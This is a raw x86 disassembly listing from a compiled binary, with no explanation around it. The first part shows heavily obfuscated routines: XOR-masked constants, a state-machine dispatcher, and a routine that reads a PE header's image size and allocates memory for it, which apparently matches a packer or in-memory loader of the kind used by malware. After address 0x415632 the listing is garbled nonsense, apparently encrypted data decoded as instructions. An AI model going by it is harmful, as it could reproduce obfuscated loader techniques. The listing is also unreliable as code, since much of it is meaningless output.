  4152b3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152ba:	xor    al,cl
  4152bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4152bf:	mov    ecx,DWORD PTR [ecx]
  4152c1:	xor    ecx,edi
  4152c3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152ca:	or     al,cl
  4152cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4152cf:	mov    ecx,DWORD PTR [ecx]
  4152d1:	xor    ecx,edi
  4152d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  4152da:	cmp    cl,al
  4152dc:	jne    0x41532e
  4152de:	mov    eax,DWORD PTR [ebp-0x14]
  4152e1:	mov    eax,DWORD PTR [eax]
  4152e3:	xor    eax,edi
  4152e5:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4152ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4152ef:	mov    ecx,DWORD PTR [ecx]
  4152f1:	xor    ecx,edi
  4152f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152fa:	xor    al,cl
  4152fc:	mov    ecx,DWORD PTR [ebp-0x10]
  4152ff:	mov    ecx,DWORD PTR [ecx]
  415301:	xor    ecx,edi
  415303:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  41530a:	or     al,cl
  41530c:	mov    ecx,DWORD PTR [ebp-0x14]
  41530f:	mov    ecx,DWORD PTR [ecx]
  415311:	xor    ecx,edi
  415313:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  41531a:	cmp    cl,al
  41531c:	jne    0x41532e
  41531e:	lea    eax,[ebp-0x4c]
  415321:	push   eax
  415322:	call   0x414de8
  415327:	mov    ecx,DWORD PTR [ebp-0x44]
  41532a:	cmp    eax,ecx
  41532c:	je     0x415338
  41532e:	mov    eax,DWORD PTR [ebp+0x8]
  415331:	xor    eax,edi
  415333:	add    eax,ebx
  415335:	mov    DWORD PTR [ebp+0x18],eax
  415338:	mov    eax,DWORD PTR [ebp-0x8]
  41533b:	xor    eax,edi
  41533d:	lea    eax,[eax+esi*1+0x3272dd]
  415344:	xor    eax,edi
  415346:	mov    ecx,DWORD PTR [ebp+0x8]
  415349:	mov    edx,DWORD PTR [ebp+0x18]
  41534c:	xor    ecx,edi
  41534e:	add    ecx,ebx
  415350:	cmp    edx,ecx
  415352:	je     0x41514f
  415358:	mov    eax,DWORD PTR [ebp+0x8]
  41535b:	mov    ecx,DWORD PTR [ebp+0x18]
  41535e:	xor    eax,edi
  415360:	add    eax,ebx
  415362:	cmp    ecx,eax
  415364:	jne    0x415377
  415366:	mov    eax,DWORD PTR [ebp-0x8]
  415369:	mov    ecx,DWORD PTR [ebp+0x1c]
  41536c:	xor    eax,edi
  41536e:	lea    eax,[eax+ecx*1+0x3272dd]
  415375:	jmp    0x4153ee
  415377:	push   0x18
  415379:	push   DWORD PTR [ebp-0x4]
  41537c:	lea    eax,[ebp-0x64]
  41537f:	push   eax
  415380:	call   0x414620
  415385:	mov    eax,DWORD PTR [ebp+0x8]
  415388:	mov    ecx,DWORD PTR [ebp-0x18]
  41538b:	xor    eax,edi
  41538d:	add    eax,ebx
  41538f:	cmp    eax,ecx
  415391:	je     0x4153a6
  415393:	mov    eax,DWORD PTR [ebp+0x8]
  415396:	xor    eax,edi
  415398:	add    eax,ebx
  41539a:	push   eax
  41539b:	push   0x18
  41539d:	lea    eax,[ebp-0x64]
  4153a0:	push   eax
  4153a1:	call   0x414b97
  4153a6:	mov    eax,DWORD PTR [ebp-0x4]
  4153a9:	add    eax,0x18
  4153ac:	mov    DWORD PTR [ebp+0x18],eax
  4153af:	push   DWORD PTR [ebp-0x50]
  4153b2:	push   DWORD PTR [ebp+0x18]
  4153b5:	mov    eax,DWORD PTR [ebp-0x54]
  4153b8:	add    eax,DWORD PTR [ebp-0x20]
  4153bb:	push   eax
  4153bc:	call   0x414620
  4153c1:	mov    eax,DWORD PTR [ebp+0x8]
  4153c4:	mov    ecx,DWORD PTR [ebp-0x18]
  4153c7:	xor    eax,edi
  4153c9:	add    eax,ebx
  4153cb:	cmp    eax,ecx
  4153cd:	je     0x4153e0
  4153cf:	push   0x0
  4153d1:	push   DWORD PTR [ebp-0x50]
  4153d4:	mov    eax,DWORD PTR [ebp-0x54]
  4153d7:	add    eax,DWORD PTR [ebp-0x20]
  4153da:	push   eax
  4153db:	call   0x414b97
  4153e0:	mov    eax,DWORD PTR [ebp-0x24]
  4153e3:	mov    ecx,DWORD PTR [ebp-0x50]
  4153e6:	add    DWORD PTR [eax],ecx
  4153e8:	mov    eax,DWORD PTR [ebp-0x50]
  4153eb:	add    eax,DWORD PTR [ebp+0x1c]
  4153ee:	mov    DWORD PTR [ebp+0x1c],eax
  4153f1:	mov    eax,DWORD PTR [ebp-0x8]
  4153f4:	mov    ecx,DWORD PTR [ebp+0x1c]
  4153f7:	xor    eax,edi
  4153f9:	add    eax,ebx
  4153fb:	imul   eax,ecx
  4153fe:	mov    ecx,DWORD PTR [ebp+0x8]
  415401:	mov    edx,DWORD PTR [ebp-0x28]
  415404:	xor    ecx,edi
  415406:	lea    ecx,[ecx+edx*1+0x3272dd]
  41540d:	cmp    eax,ecx
  41540f:	jb     0x41506c
  415415:	mov    esi,DWORD PTR [ebp+0x14]
  415418:	mov    eax,DWORD PTR [ebp-0x20]
  41541b:	mov    DWORD PTR [esi],eax
  41541d:	jmp    0x415464
  41541f:	mov    ecx,DWORD PTR [ebp+0x8]
  415422:	mov    edx,DWORD PTR [ebp+0xc]
  415425:	xor    ecx,edi
  415427:	xor    edx,edi
  415429:	add    ecx,ebx
  41542b:	add    edx,ebx
  41542d:	cmp    ecx,edx
  41542f:	jne    0x415443
  415431:	mov    eax,ds:0x7f642d1c
  415436:	imul   eax,eax,0x9f15fcef
  41543c:	mov    ds:0x7f642d1c,eax
  415441:	jmp    0x415464
  415443:	mov    ecx,DWORD PTR [ebp+0x8]
  415446:	xor    ecx,edi
  415448:	add    ecx,ebx
  41544a:	cmp    eax,ecx
  41544c:	je     0x41545a
  41544e:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  415458:	jmp    0x415464
  41545a:	and    DWORD PTR ds:0x3343fa1c,0x5265ec3f
  415464:	pop    edi
  415465:	pop    esi
  415466:	pop    ebx
  415467:	leave  
  415468:	ret    0x18
  41546b:	push   ebp
  41546c:	mov    ebp,esp
  41546e:	and    esp,0xfffffff8
  415471:	mov    eax,DWORD PTR [ebp+0x20]
  415474:	sub    esp,0x14
  415477:	push   ebx
  415478:	mov    ebx,DWORD PTR [ebp+0x14]
  41547b:	push   esi
  41547c:	push   edi
  41547d:	cmp    eax,0xf89c85b5
  415482:	jne    0x41548e
  415484:	push   0xf89c85b2
  415489:	jmp    0x4155c0
  41548e:	mov    eax,DWORD PTR [ebp+0x20]
  415491:	cmp    eax,0xf89c85b2
  415496:	jne    0x4154a2
  415498:	push   0xf89c85b3
  41549d:	jmp    0x4155c0
  4154a2:	mov    eax,DWORD PTR [ebp+0x20]
  4154a5:	cmp    eax,0xf89c85b3
  4154aa:	jne    0x4154b6
  4154ac:	push   0xf89c85b0
  4154b1:	jmp    0x4155c0
  4154b6:	mov    eax,DWORD PTR [ebp+0x20]
  4154b9:	cmp    eax,0xf89c85b0
  4154be:	jne    0x4154ca
  4154c0:	push   0xf89c85b1
  4154c5:	jmp    0x4155c0
  4154ca:	mov    ecx,DWORD PTR [ebp+0x20]
  4154cd:	mov    eax,0xf89c85bc
  4154d2:	cmp    ecx,eax
  4154d4:	jne    0x415590
  4154da:	mov    eax,DWORD PTR [ebp+0x10]
  4154dd:	mov    DWORD PTR [esp+0xc],eax
  4154e1:	mov    eax,DWORD PTR [ebp+0x18]
  4154e4:	mov    DWORD PTR [esp+0x14],eax
  4154e8:	mov    eax,DWORD PTR [ebp+0xc]
  4154eb:	mov    DWORD PTR [esp+0x18],eax
  4154ef:	mov    eax,DWORD PTR [ebp+0x8]
  4154f2:	mov    DWORD PTR [esp+0x10],eax
  4154f6:	mov    eax,DWORD PTR [esp+0x10]
  4154fa:	mov    ecx,DWORD PTR [esp+0x14]
  4154fe:	mov    edi,0x7510896
  415503:	xor    eax,edi
  415505:	mov    esi,0x3272dd
  41550a:	add    eax,esi
  41550c:	mov    DWORD PTR [ecx],eax
  41550e:	mov    eax,DWORD PTR [esp+0xc]
  415512:	mov    eax,DWORD PTR [eax+0x194]
  415518:	mov    ecx,DWORD PTR [eax]
  41551a:	mov    eax,DWORD PTR [esp+0xc]
  41551e:	mov    eax,DWORD PTR [eax+0x194]
  415524:	mov    eax,DWORD PTR [eax]
  415526:	add    eax,DWORD PTR [ecx+0x3c]
  415529:	mov    ecx,DWORD PTR [esp+0xc]
  41552d:	mov    ecx,DWORD PTR [ecx+0x1d8]
  415533:	mov    ecx,DWORD PTR [ecx+0x14]
  415536:	push   0x4
  415538:	push   0x3000
  41553d:	push   DWORD PTR [eax+0x50]
  415540:	push   0x0
  415542:	call   ecx
  415544:	mov    DWORD PTR [ebx],eax
  415546:	mov    eax,DWORD PTR [esp+0x10]
  41554a:	push   DWORD PTR [esp+0xc]
  41554e:	xor    eax,edi
  415550:	add    eax,esi
  415552:	mov    DWORD PTR [esp+0x20],eax
  415556:	lea    eax,[esp+0x20]
  41555a:	push   eax
  41555b:	push   ebx
  41555c:	push   DWORD PTR [esp+0x20]
  415560:	push   DWORD PTR [esp+0x28]
  415564:	push   DWORD PTR [esp+0x24]
  415568:	call   0x414f2c
  41556d:	mov    eax,DWORD PTR [esp+0x10]
  415571:	mov    ecx,DWORD PTR [ebx]
  415573:	xor    eax,edi
  415575:	add    eax,esi
  415577:	cmp    ecx,eax
  415579:	je     0x4155d7
  41557b:	mov    eax,DWORD PTR [esp+0x18]
  41557f:	mov    ecx,DWORD PTR [esp+0x14]
  415583:	xor    eax,edi
  415585:	add    eax,esi
  415587:	imul   eax,DWORD PTR [esp+0x1c]
  41558c:	mov    DWORD PTR [ecx],eax
  41558e:	jmp    0x4155d7
  415590:	mov    ecx,DWORD PTR [ebp+0x20]
  415593:	cmp    ecx,0xf89c85b1
  415599:	jne    0x4155a2
  41559b:	push   0xf89c85be
  4155a0:	jmp    0x4155c0
  4155a2:	mov    ecx,DWORD PTR [ebp+0x20]
  4155a5:	cmp    ecx,0xf89c85be
  4155ab:	jne    0x4155b4
  4155ad:	push   0xf89c85bf
  4155b2:	jmp    0x4155c0
  4155b4:	mov    ecx,DWORD PTR [ebp+0x20]
  4155b7:	cmp    ecx,0xf89c85bf
  4155bd:	jne    0x4155d7
  4155bf:	push   eax
  4155c0:	push   DWORD PTR [ebp+0x1c]
  4155c3:	push   DWORD PTR [ebp+0x18]
  4155c6:	push   ebx
  4155c7:	push   DWORD PTR [ebp+0x10]
  4155ca:	push   DWORD PTR [ebp+0xc]
  4155cd:	push   DWORD PTR [ebp+0x8]
  4155d0:	call   0x41546b
  4155d5:	mov    DWORD PTR [ebx],eax
  4155d7:	mov    eax,DWORD PTR [ebx]
  4155d9:	pop    edi
  4155da:	pop    esi
  4155db:	pop    ebx
  4155dc:	mov    esp,ebp
  4155de:	pop    ebp
  4155df:	ret    0x1c
  4155e2:	push   ebp
  4155e3:	mov    ebp,esp
  4155e5:	sub    esp,0xc
  4155e8:	mov    eax,0xf89c85b5
  4155ed:	mov    DWORD PTR [ebp-0x8],eax
  4155f0:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  4155f7:	mov    ecx,DWORD PTR [ebp-0x8]
  4155fa:	xor    ecx,0x7510896
  415600:	add    ecx,0x3272dd
  415606:	mov    DWORD PTR [ebp-0x4],ecx
  415609:	mov    ecx,DWORD PTR [ebp+0xc]
  41560c:	push   eax
  41560d:	mov    DWORD PTR [ebp+0xc],ecx
  415610:	push   DWORD PTR [ebp+0xc]
  415613:	lea    eax,[ebp-0x4]
  415616:	push   DWORD PTR [ebp+0x8]
  415619:	push   eax
  41561a:	push   DWORD PTR [ebp+0xc]
  41561d:	push   DWORD PTR [ebp-0xc]
  415620:	push   DWORD PTR [ebp-0x8]
  415623:	call   0x41546b
  415628:	mov    DWORD PTR [ebp-0x4],eax
  41562b:	mov    eax,DWORD PTR [ebp-0x4]
  41562e:	leave  
  41562f:	ret    0x8
  415632:	mov    cl,0x27
  415634:	popa   
  415635:	test   bh,dh
  415637:	(bad)  
  415638:	cmc    
  415639:	aaa    
  41563a:	push   ss
  41563b:	shr    BYTE PTR [edi],0x1f
  41563e:	push   cs
  41563f:	and    dh,al
  415641:	ins    DWORD PTR es:[edi],dx
  415642:	jns    0x415618
  415644:	add    BYTE PTR [eax],al
  415646:	repz add al,0x0
  415649:	add    BYTE PTR [esi+0x61],bh
  41564c:	fld    TBYTE PTR [eax]
  41564e:	sysret 
  415650:	xchg   ebx,eax
  415651:	jo     0x4156b2
  415653:	inc    ecx
  415654:	xchg   ebx,eax
  415655:	test   al,cl
  415657:	aaa    
  415658:	mov    bh,BYTE PTR [esi+0x55]
  41565b:	(bad)  
  41565c:	out    dx,eax
  41565d:	mov    ?,esi
  41565f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415660:	jb     0x415626
  415662:	mov    bl,0xa9
  415664:	push   eax
  415665:	and    DWORD PTR [edi+eax*1-0x5a32e5f9],ebp
  41566c:	push   ds
  41566d:	mov    ch,0x61
  41566f:	mov    al,0xb2
  415671:	cmp    eax,0xd8f38c35
  415676:	mov    ?,WORD PTR [ebx+ebx*4]
  415679:	hlt    
  41567a:	mov    esp,0x13fe72a8
  41567f:	loopne 0x415633
  415681:	pop    ebp
  415682:	xor    al,0xbc
  415684:	lahf   
  415685:	outs   dx,BYTE PTR ds:[esi]
  415686:	or     BYTE PTR [eax-0x2d],ah
  415689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41568a:	sub    eax,0xb9ddb02c
  41568f:	inc    ebx
  415690:	pusha  
  415691:	(bad)  
  415692:	jns    0x41564b
  415694:	mov    ch,0x73
  415696:	addr16 gs fsub st(0),st
  41569a:	ret    0x6e5b
  41569d:	lods   al,BYTE PTR ds:[esi]
  41569e:	xchg   DWORD PTR [edx-0x3960283b],edi
  4156a4:	sub    bl,al
  4156a6:	test   eax,0x852a4e10
  4156ab:	pusha  
  4156ac:	sub    edx,DWORD PTR [esi+ebp*8]
  4156af:	pop    esi
  4156b0:	in     al,0xd6
  4156b2:	ficom  WORD PTR [ebp-0x193eb61a]
  4156b8:	setl   BYTE PTR [ecx]
  4156bb:	push   esi
  4156bc:	push   edx
  4156bd:	cmp    DWORD PTR ds:0xe178627d,esi
  4156c3:	xor    ecx,DWORD PTR [edx]
  4156c5:	ss idiv bh
  4156c8:	aad    0x92
  4156ca:	adc    al,0x61
  4156cc:	jp     0x4156ea
  4156ce:	leave  
  4156cf:	popa   
  4156d0:	fwait
  4156d1:	pop    eax
  4156d2:	mov    ds:0x3e9f61e5,al
  4156d7:	scas   al,BYTE PTR es:[edi]
  4156d8:	shl    BYTE PTR [edi-0x2],0xb5
  4156dc:	and    DWORD PTR [ecx],ecx
  4156de:	mov    edi,0x6d0ba65c
  4156e3:	mov    ch,dl
  4156e5:	or     al,0xe4
  4156e7:	or     ah,0x5a
  4156ea:	hlt    
  4156eb:	pop    edx
  4156ec:	push   ebx
  4156ed:	imul   eax,DWORD PTR [eax+0x73c7d98f],0xffffff9f
  4156f4:	mov    dh,ch
  4156f6:	cmp    DWORD PTR [ebx+eiz*4-0x39444230],0x8fef3c8e
  415701:	cs sti 
  415703:	int3   
  415704:	fld    QWORD PTR [edx-0x6f902c0e]
  41570a:	jg     0x415754
  41570c:	fnop   
  41570e:	pushf  
  41570f:	sub    edi,DWORD PTR [ecx-0x76]
  415712:	sbb    BYTE PTR [edi-0x79],0xcd
  415716:	jnp    0x4156b5
  415718:	xchg   BYTE PTR [edi],al
  41571a:	cld    
  41571b:	push   es
  41571c:	jp     0x4156cc
  41571e:	inc    ecx
  41571f:	inc    esp
  415720:	sbb    eax,0xa58aec36
  415725:	adc    DWORD PTR [eax+0xfd6ec1f],edi
  41572b:	ja     0x4157a3
  41572d:	xor    al,0xb0
  41572f:	jmp    FWORD PTR [edx-0x842a6cd]
  415735:	inc    ecx
  415737:	push   edi
  415738:	pop    edi
  415739:	cmc    
  41573a:	cli    
  41573b:	sbb    esp,edx
  41573d:	or     dl,BYTE PTR [ebp-0x3bcf5b97]
  415743:	adc    BYTE PTR [eax+0x1d5b1cb8],ah
  415749:	cmp    DWORD PTR [esi+0x6d98daef],ebx
  41574f:	in     eax,0xfc
  415751:	test   ecx,eax
  415753:	and    esi,DWORD PTR [esi-0x2803391a]
  415759:	pop    ebx
  41575a:	test   eax,0xab2903f7
  41575f:	inc    ecx
  415760:	adc    DWORD PTR [eax+0x7cdc4311],ecx
  415766:	push   ebx
  415767:	stos   DWORD PTR es:[edi],eax
  415768:	dec    edx
  415769:	(bad)  
  41576b:	jo     0x41572a
  41576d:	gs jp  0x415781
  415770:	icebp  
  415771:	adc    al,0x5c
  415773:	pop    DWORD PTR [eax]
  415775:	and    al,0x83
  415777:	mov    ah,0x9
  415779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41577a:	(bad)  
  41577b:	xchg   ebp,eax
  41577c:	into   
  41577d:	mov    dx,0xe186
  415781:	sbb    eax,0x2901d1cc
  415786:	outs   dx,BYTE PTR ds:[esi]
  415787:	inc    ebp
  415788:	pop    ebx
  415789:	rcl    DWORD PTR [edi-0x6d],0xe2
  41578d:	pusha  
  41578e:	xchg   esp,eax
  41578f:	test   eax,0x2027b3bc
  415794:	std    
  415795:	xchg   BYTE PTR [edi+0x7b646050],dl
  41579b:	mov    edx,0xebccc3a2
  4157a0:	data16 mov ah,BYTE PTR [eax]
  4157a3:	sbb    dh,0xd1
  4157a6:	mov    BYTE PTR [esi+0x34],dl
  4157a9:	xlat   BYTE PTR ds:[ebx]
  4157aa:	gs clc 
  4157ac:	ins    DWORD PTR es:[edi],dx
  4157ad:	enter  0x96c3,0x24
  4157b1:	jp     0x4157a5
  4157b3:	aaa    
  4157b4:	mov    ebp,DWORD PTR [esi+0x7b]
  4157b7:	push   ebx
  4157b8:	call   0x75f6:0xbe055854
  4157bf:	add    BYTE PTR [esi],dh
  4157c1:	(bad)  
  4157c3:	push   esp
  4157c4:	retf   
  4157c5:	aas    
  4157c6:	dec    eax
  4157c7:	outs   dx,DWORD PTR ds:[esi]
  4157c8:	arpl   WORD PTR [edx],sp
  4157ca:	imul   edi,eax,0xffffffba
  4157cd:	dec    ecx
  4157ce:	xchg   BYTE PTR [ebx],cl
  4157d0:	loope  0x415772
  4157d2:	push   ebx
  4157d3:	aam    0x45
  4157d5:	xchg   edx,eax
  4157d6:	or     bh,0x9f
  4157d9:	dec    ebp
  4157da:	cmp    DWORD PTR [ebx-0x7],0xe008a70c
  4157e1:	xchg   ch,bl
  4157e3:	push   eax
  4157e4:	mov    cl,0xbe
  4157e6:	cmp    DWORD PTR [edx],esp
  4157e8:	repz push ebx
  4157ea:	data16 inc BYTE PTR [eax+0x30]
  4157ee:	jl     0x4157fe
  4157f0:	pushf  
  4157f1:	sbb    DWORD PTR [edx+eiz*8+0x29],edx
  4157f5:	pop    ecx
  4157f6:	adc    al,0x50
  4157f8:	sub    BYTE PTR [edi],ah
  4157fa:	add    DWORD PTR [ebx],0x43
  4157fd:	inc    ebx
  4157fe:	out    0x5d,al
  415800:	fdivr  DWORD PTR [ebx+edx*2]
  415803:	mov    ds:0x6de6d528,eax
  415808:	push   esi
  415809:	pop    edi
  41580a:	and    BYTE PTR [eax+0x33],cl
  41580d:	mov    dh,0x55
  41580f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415810:	xor    al,0xdc
  415812:	sub    al,0xd
  415814:	xchg   DWORD PTR [ebx+0xfac057b],edi
  41581a:	icebp  
  41581b:	lea    ebp,[eax]
  41581d:	jb     0x4157e7
  41581f:	jecxz  0x4157f2
  415821:	and    eax,0xcd15d9fa
  415826:	xchg   esi,eax
  415827:	hlt    
  415828:	lea    edi,ds:0x121efdb3
  41582e:	xor    DWORD PTR [esi+0x6b],ebp
  415831:	jecxz  0x415855
  415833:	adc    BYTE PTR [edx-0x5f],bl
  415836:	sub    al,0x9a
  415838:	dec    esi
  415839:	adc    DWORD PTR [edi+0x520cf14b],0x300b161d
  415843:	fmul   DWORD PTR [esi-0x43af0711]
  415849:	pop    ecx
  41584a:	dec    eax
  41584b:	icebp  
  41584c:	and    dh,BYTE PTR [ebp-0x38]
  41584f:	sbb    bh,BYTE PTR [esi+0x1d7c40d3]
  415855:	outs   dx,DWORD PTR ds:[esi]
  415856:	std    
  415857:	shl    BYTE PTR [ecx+0x2a],cl
  41585a:	xchg   edx,eax
  41585b:	dec    ecx
  41585c:	mov    ebp,0x75bf8563
  415861:	jmp    0xdaf0:0x59fb62e
  415868:	and    ah,bh
  41586a:	es sti 
  41586c:	cmp    eax,0x2b7165f5
  415871:	and    ebp,ebp
  415873:	mov    bh,0x74
  415875:	pop    ebx
  415876:	jo     0x415806
  415878:	xchg   BYTE PTR [ebx-0xc6925e0],dh
  41587e:	loop   0x415877
  415880:	mov    ch,0xf0
  415882:	and    dl,BYTE PTR [ebp-0x5a]
  415885:	or     eax,DWORD PTR [ebp+ebx*4+0xc]
  415889:	ins    BYTE PTR es:[edi],dx
  41588a:	ins    DWORD PTR es:[edi],dx
  41588b:	nop
  41588c:	mov    DWORD PTR [edi+0x3ff45b16],edi
  415892:	mov    esi,0x9d01a792
  415897:	js     0x41590e
  415899:	mov    ecx,0x62dc2af6
  41589e:	jnp    0x4158a6
  4158a0:	sbb    al,0x28
  4158a2:	xchg   esp,eax
  4158a3:	imul   esi,esp,0x56f182a
  4158a9:	xchg   ebp,eax
  4158aa:	sbb    ch,BYTE PTR [ecx+ebp*8]
  4158ad:	mov    edx,0x648b4d77
  4158b2:	rcr    BYTE PTR [edx],cl
  4158b4:	mov    eax,0x61d960e8
  4158b9:	mov    bh,0x49
  4158bb:	push   ss
  4158bc:	dec    esi
  4158bd:	mov    ebp,0xd03e4654
  4158c2:	fbld   TBYTE PTR [edi+0x5a82a2de]
  4158c8:	push   eax
  4158c9:	mov    ds:0x91adf92e,al
  4158ce:	push   ecx
  4158cf:	and    DWORD PTR [ecx],esi
  4158d1:	add    cl,BYTE PTR [edx+edx*1-0x2c8f5764]
  4158d8:	stos   BYTE PTR es:[edi],al
  4158d9:	sub    DWORD PTR [ebp+0x165b7b1a],eax
  4158df:	(bad)
  4158e2:	mov    al,0x3c
  4158e4:	dec    esp
  4158e5:	mov    ds:0x4e287c77,al
  4158ea:	and    dl,dh
  4158ec:	stos   BYTE PTR es:[edi],al
  4158ed:	pop    edi
  4158ee:	inc    ecx
  4158ef:	dec    esi
  4158f0:	push   ss
  4158f1:	daa    
  4158f2:	(bad)  
  4158f3:	fcmovu st,st(7)
  4158f5:	out    dx,al
  4158f6:	scas   eax,DWORD PTR es:[edi]
  4158f7:	and    DWORD PTR [edi],eax
  4158f9:	cmc    
  4158fa:	sti    
  4158fb:	sub    DWORD PTR [ebx+0x270cc6fa],ebx
  415901:	cld    
  415902:	sub    DWORD PTR [edi],ebx
  415904:	push   edi
  415905:	add    BYTE PTR [edi-0x7e7bfdd1],cl
  41590b:	test   al,0x73
  41590d:	fcmovu st,st(7)
  41590f:	dec    ecx
  415910:	cmp    edi,DWORD PTR [esi-0x24c3f3df]
  415916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415917:	aaa    
  415918:	mov    gs,WORD PTR [eax]
  41591a:	and    eax,0x98ed478e
  41591f:	sub    al,0xcd
  415921:	adc    esp,DWORD PTR [ecx]
  415923:	test   BYTE PTR [ecx+ebx*2],bl
  415926:	aaa    
  415927:	ret    0xb07c
  41592a:	inc    ebx
  41592b:	test   eax,0xacdce421
  415930:	in     al,0x97
  415932:	xchg   esp,eax
  415933:	test   DWORD PTR [ebx+0x33],0xf1669bb0
  41593a:	outs   dx,BYTE PTR ds:[esi]
  41593b:	mov    edx,0xcde6eab8
  415940:	xor    edi,DWORD PTR ds:0xa802f66
  415946:	int3   
  415947:	jo     0x4159c8
  415949:	das    
  41594a:	(bad)  
  41594b:	cld    
  41594c:	and    ecx,0x7d
  41594f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415950:	pop    ecx
  415951:	std    
  415952:	popf   
  415953:	popf   
  415954:	jmp    0xd864:0x5eef77c6
  41595b:	add    BYTE PTR [ecx],dl
  41595d:	push   0x45
  41595f:	icebp  
  415960:	lock pushf 
  415962:	cli    
  415963:	push   esi
  415964:	mov    esi,0xd8419ed4
  415969:	xor    BYTE PTR [eax-0x4e7bc0c6],dh
  41596f:	cld    
  415970:	pop    eax
  415971:	mov    cl,0x30
  415973:	xchg   esi,eax
  415974:	and    DWORD PTR [edi+0x7],0x51
  415978:	call   DWORD PTR cs:[edx+esi*1]
  41597c:	xor    bl,BYTE PTR [ebx+edx*8]
  41597f:	and    al,0x64
  415981:	and    edi,ebp
  415983:	aas    
  415984:	jp     0x4159e9
  415986:	mov    dl,0xe8
  415988:	and    eax,0x507e06b7
  41598d:	and    dl,BYTE PTR [esp+ebp*4]
  415990:	dec    esp
  415991:	dec    esi
  415992:	aad    0x1a
  415994:	sbb    esp,DWORD PTR [ebx-0x2c9dc65]
  41599a:	mov    esi,0xc34c459c
  41599f:	xor    BYTE PTR [ebx],dl
  4159a1:	rcr    dl,0x9d
  4159a4:	push   esi
  4159a5:	in     eax,dx
  4159a6:	mov    edx,0x59a16a3b
  4159ab:	retf   0x2f59
  4159ae:	dec    ebx
  4159af:	retf   0x94c3
  4159b2:	sbb    BYTE PTR [edx],dh
  4159b4:	gs cmc 
  4159b6:	and    edx,DWORD PTR ss:[ebx-0x4d]
  4159ba:	cwde   
  4159bb:	jb     0x4159af
  4159bd:	push   ebx
  4159be:	(bad)  
  4159bf:	jge    0x4159a3
  4159c1:	leave  
  4159c2:	sub    eax,0x4b528226
  4159c7:	sbb    al,0x46
  4159c9:	rcr    DWORD PTR [edi],1
  4159cb:	dec    edx
  4159cc:	mov    ecx,0x3c01f750
  4159d1:	pop    edi
  4159d2:	adc    BYTE PTR [ebx+0x4bbbd97f],dh
  4159d8:	xor    DWORD PTR [esi+ebx*1+0x57],ebx
  4159dc:	das    
  4159dd:	dec    edi
  4159de:	or     DWORD PTR [edi+0x29],0x440402c1
  4159e5:	in     eax,dx
  4159e6:	neg    DWORD PTR [edx-0x2e987cf6]
  4159ec:	mov    bh,0x63
  4159ee:	(bad)  
  4159ef:	cld    
  4159f0:	lsl    edx,ax
  4159f3:	xor    eax,0x71a56f89
  4159f8:	outs   dx,BYTE PTR ds:[esi]
  4159f9:	pop    edi
  4159fa:	std    
  4159fb:	(bad)  
  4159fc:	xor    al,BYTE PTR [esi+esi*1]
  4159ff:	push   ss
  415a00:	pop    ecx
  415a01:	jo     0x4159a4
  415a03:	iret   
  415a04:	cs jp  0x415a0c
  415a07:	push   0x597a5d1e
  415a0c:	cmp    DWORD PTR [ecx+0x10363bc6],esi
  415a12:	push   edx
  415a13:	or     DWORD PTR [esi],esp
  415a15:	mov    edi,0xa10af7af
  415a1a:	add    DWORD PTR [ebx-0x7c],0x54862b16
  415a21:	mov    eax,0x15c8948
  415a26:	icebp  
  415a27:	mov    ebx,0x1ef78c3c
  415a2c:	sar    BYTE PTR [eax],0x32
  415a2f:	cmp    dh,BYTE PTR [esi+0x5d]
  415a32:	pop    ecx
  415a33:	mov    BYTE PTR [edi+0x68],ch
  415a36:	mov    ch,0x27
  415a38:	sub    BYTE PTR ds:0x33f00a4f,cl
  415a3e:	add    bh,BYTE PTR [eax-0x47]
  415a41:	sub    eax,0x80c65025
  415a46:	pop    esp
  415a47:	dec    edx
  415a48:	outs   dx,BYTE PTR ds:[esi]
  415a49:	push   es
  415a4a:	sbb    eax,0x60bd5832
  415a4f:	cmp    dl,ah
  415a51:	adc    bh,BYTE PTR [ebx]
  415a53:	adc    bh,BYTE PTR [edx-0x6a]
  415a56:	fidiv  DWORD PTR [edi]
  415a58:	jle    0x415aa9
  415a5a:	mov    DWORD PTR [edx],ebp
  415a5c:	jl     0x415ad9
  415a5e:	adc    al,0xb3
  415a60:	push   0x4a
  415a62:	and    bl,0x9c
  415a65:	jp     0x415ab7
  415a67:	sbb    ah,BYTE PTR [ecx+0x1f0c9b30]
  415a6d:	cld    
  415a6e:	fwait
  415a6f:	jno    0x415a61
  415a71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a72:	push   eax
  415a73:	pop    esi
  415a74:	sub    eax,0xb8d48291
  415a79:	icebp  
  415a7a:	sub    DWORD PTR [ebx],esp
  415a7c:	hlt    
  415a7d:	lock stos BYTE PTR es:[edi],al
  415a7f:	jno    0x415a8a
  415a81:	neg    DWORD PTR [eax]
  415a83:	mov    esi,ebx
  415a85:	add    BYTE PTR ss:[eax+0xc],0xfe
  415a8a:	and    al,0xb4
  415a8c:	dec    eax
  415a8d:	or     al,0x23
  415a8f:	into   
  415a90:	inc    edx
  415a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a92:	mov    edi,0x555a72e7
  415a97:	test   DWORD PTR [edx-0x6a18fa8b],ebp
  415a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a9e:	(bad)  
  415a9f:	push   eax
  415aa0:	mov    edi,DWORD PTR fs:[ebp+0x6aa2a24f]
  415aa7:	sbb    al,bh
  415aa9:	fist   WORD PTR [ebx-0x69f7b6b1]
  415aaf:	pop    ss
  415ab0:	inc    eax
  415ab1:	sahf   
  415ab2:	adc    esi,DWORD PTR [edi+eiz*8-0x7fabd1ae]
